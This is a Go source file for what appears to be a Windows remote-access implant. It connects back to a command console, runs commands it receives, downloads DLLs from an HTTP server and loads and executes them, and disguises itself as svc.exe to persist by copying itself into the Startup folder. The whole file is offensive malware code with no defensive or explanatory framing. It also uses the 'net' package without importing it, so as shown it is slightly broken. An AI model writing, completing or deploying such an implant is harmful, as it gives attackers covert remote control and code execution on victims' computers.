package main

// #include <stdlib.h>
import "C"

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	consoleAddr = "localhost:5000"
	httpServer  = "http://localhost:80"
)

var dllHandle syscall.Handle

func cleanup(handle syscall.Handle) {
	time.Sleep(2 * time.Second)
	if handle != 0 {
		syscall.FreeLibrary(handle)
		dllHandle = 0
	}
}

// Get full path to a DLL in temp folder
func tempDLLPath(dll string) string {
	return filepath.Join(os.TempDir(), dll)
}

func downloadDLL(dll string) error {
	dllPath := tempDLLPath(dll)

	// Remove existing DLL before re-downloading
	os.Remove(dllPath)

	resp, err := http.Get(httpServer + "/downloads/" + dll)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()

	f, err := os.Create(dllPath)
	if err != nil {
		return fmt.Errorf("create failed: %w", err)
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return err
}

func callDLL(dllName, funcName, arg1, arg2 string) (string, error) {
	dllPath := tempDLLPath(dllName)

	dll, err := syscall.LoadLibrary(dllPath)
	if err != nil {
		return "", fmt.Errorf("load failed: %v", err)
	}
	dllHandle = dll

	proc, err := syscall.GetProcAddress(dll, funcName)
	if err != nil {
		return "", fmt.Errorf("proc not found: %v", err)
	}

	output := make([]byte, 1<<24)
	cArg1 := append([]byte(arg1), 0)
	cArg2 := append([]byte(arg2), 0)

	_, _, _ = syscall.Syscall6(
		proc,
		4,
		uintptr(unsafe.Pointer(&output[0])), uintptr(len(output)),
		uintptr(unsafe.Pointer(&cArg1[0])), uintptr(unsafe.Pointer(&cArg2[0])),
		0, 0,
	)

	// Read null-terminated C string from output buffer
	end := 0
	for end < len(output) && output[end] != 0 {
		end++
	}

	return string(output[:end]), nil
}

// Remove a specific DLL from the temp folder
func removeDLL(name string) error {
	dllPath := tempDLLPath(name)
	err := os.Remove(dllPath)
	if err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to remove %s: %w", dllPath, err)
	}
	return nil
}


// Add persistence by copying itself to startup
func persistent() string {
	exe, err := os.Executable()
	if err != nil {
		return "get exe failed: " + err.Error()
	}
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	data, err := os.ReadFile(exe)
	if err != nil {
		return "read self failed: " + err.Error()
	}
	if err := os.WriteFile(startup, data, 0755); err != nil {
		return "write failed: " + err.Error()
	}
	return "Persistence added."
}

// Remove persistence by deleting startup copy
func unpersistent() string {
	startup := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe"
	if err := os.Remove(startup); err != nil {
		return "delete failed: " + err.Error()
	}
	return "Persistence removed."
}

func handle(conn net.Conn) {
	defer conn.Close()
	for {
		buf := make([]byte, 1 << 24)
		n, err := conn.Read(buf)

		if err != nil || n == 0 {
			return
		}
		cmd := strings.TrimSpace(string(buf[:n]))
		if cmd == "" {
			continue
		}

		parts := strings.SplitN(cmd, " ", 3)
		if len(parts) < 3 {
			conn.Write([]byte("Usage: dll/function arg1 arg2\n"))
			continue
		}

		dllFunc := parts[0]
		args := parts[1:]
		split := strings.Split(dllFunc, "/")
		if len(split) != 2 {
			conn.Write([]byte("Invalid format: use dll/function\n"))
			continue
		}
		
		dllFile, fn := split[0], split[1]

		// Internal static commands
		if dllFile == "static" {
			var output string
			switch fn {
			case "persistent":
				output = persistent()
			case "unpersistent":
				output = unpersistent()
			default:
				output = "Unknown static function"
			}
			conn.Write([]byte(output + "\n"))
			continue
		}

		// External DLL command
		if _, err := os.Stat(dllFile); os.IsNotExist(err) {
			if err := downloadDLL(dllFile); err != nil {
				conn.Write([]byte("Download failed: " + err.Error() + "\n"))
				continue
			}
		}
		result, err := callDLL(dllFile, fn, args[0], args[1])

		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
			continue
		}

		conn.Write([]byte("." + result + "\n"))
		// go cleanup(dllHandle)
	}
}

func main() {
	for {
		conn, err := net.Dial("tcp", consoleAddr)
		
		if err != nil {
			time.Sleep(60 * time.Second)
			
			continue
		}
		handle(conn)
	}
}


